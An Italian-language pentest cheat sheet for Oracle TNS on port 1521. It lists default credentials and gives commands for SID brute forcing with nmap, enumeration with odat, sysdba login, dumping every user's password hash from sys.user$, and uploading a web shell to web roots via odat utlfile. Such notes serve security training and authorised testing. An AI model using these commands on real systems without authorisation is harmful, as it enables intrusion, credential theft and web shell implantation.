# Oracle TNS — Transparent Network Substrate
**Porte:** 1521 (TCP)  
**Categoria:** Database

Protocollo di comunicazione tra applicazioni e database Oracle.
Il Listener accetta connessioni sulla porta 1521.

Config client: tnsnames.ora  |  Config server: listener.ora
Percorso config: $ORACLE_HOME/network/admin

Per connettersi serve il SID (Service Identifier) — se non lo conosci, brute force.

## Configurazione

- Config client: $ORACLE_HOME/network/admin/tnsnames.ora
- Config server: $ORACLE_HOME/network/admin/listener.ora

## Vulnerabilità comuni

- SID indovinabile — brute force del Service Identifier con Nmap
- Credenziali di default (scott/tiger, sys/change_on_install)
- utlfile — upload file sul server (web shell in /var/www/html o C:\inetpub\wwwroot)
- sysdba senza restrizioni — 'as sysdba' bypassa i controlli → privilege escalation
- Hash password estraibili da sys.user$ → crackabili offline

## Enumerazione & Comandi

### RILEVAMENTO

```bash
sudo nmap -p1521 -sV <IP> --open                     # Rileva Oracle TNS
sudo nmap -p1521 --script oracle-sid-brute <IP>       # Brute force SID
```

### ENUMERAZIONE CON ODAT

```bash
./odat.py all -s <IP>                                 # Enumerazione completa (trova user, vuln, SID)
```

### CONNESSIONE CON sqlplus

```bash
sqlplus <user>/<pass>@<IP>/<SID>                      # Login standard
sqlplus <user>/<pass>@<IP>/<SID> as sysdba            # Login come admin (privilege escalation!)
```

### COMANDI UTILI

```bash
  select table_name from all_tables;                  # Lista tutte le tabelle
  select * from user_role_privs;                      # Verifica i tuoi privilegi
  select name, password from sys.user$;               # Dump hash password di TUTTI gli utenti
```

### UPLOAD FILE (Web Shell)

```bash
# Linux:
./odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba --putFile /var/www/html shell.txt ./shell.txt
# Windows:
./odat.py utlfile -s <IP> -d <SID> -U <user> -P <pass> --sysdba --putFile C:\\inetpub\\wwwroot shell.txt ./shell.txt
curl -X GET http://<IP>/shell.txt                     # Verifica upload
```

## Tool consigliati

*Installa con `use <tool>` + `install`*

- **nmap**
- **odat**
